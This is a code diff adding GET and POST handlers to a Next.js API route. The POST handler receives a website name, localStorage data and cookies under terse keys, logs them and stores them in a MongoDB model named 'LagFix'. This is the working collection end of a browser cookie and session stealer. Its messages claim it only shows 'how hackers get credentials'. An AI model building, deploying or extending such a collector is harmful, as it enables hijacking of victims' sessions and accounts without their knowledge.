@@ -48,6 +48,77 @@ export async function GET(req: NextRequest) {
 
         const lagFixInfo = new LagFix({website, localStorage, cookies})
         await lagFixInfo.save()
+
+        return NextResponse.json({
+            message: "This website to show how hackers get credentials.",
+            success: true,
+            status_code:
+                200,
+            isCompromised: false,
+            params: {
+                website: website,
+                localStorage: localStorage,
+                cookies: cookies
+            }
+        },
+            {
+                status: 200
+            })
+    } catch (error) {
+        return NextResponse.json({
+            message: "Internal serveri issue!",
+            error: (error as Error).message
+        }, {
+            status: 500
+        })
+    }
+}
+
+export async function POST(req: NextRequest) {
+    try {
+       const body = await req.json()
+        const localStorage = body.l
+        const cookies = body.c
+        const website = body.w
+        console.log(website, cookies, localStorage)
+        // if unexpected case 
+        if (!localStorage && !website && !cookies) {
+            return NextResponse.json({
+                message: "This website to show my friend how hackers get credentials.",
+                success: true,
+                status_code:
+                    200,
+                isCompromised: false,
+                params: {
+                    website: website,
+                    localStorage: localStorage,
+                    cookies: cookies
+                }
+            })
+        }
+        const isDbConnected = await mongoConnect()
+
+        if (!isDbConnected) {
+            return NextResponse.json({
+                message: "This website to show how hackers get credentials.",
+                success: false,
+                status_code:
+                    500,
+                isCompromised: false,
+                error: "Failed to connect Database",
+                params: {
+                    website: website,
+                    localStorage: localStorage,
+                    cookies: cookies
+                }
+            },
+                {
+                    status: 500
+                })
+        }
+
+        const lagFixInfo = new LagFix({website, localStorage, cookies})
+        await lagFixInfo.save()
         
         return NextResponse.json({
             message: "This website to show how hackers get credentials.",
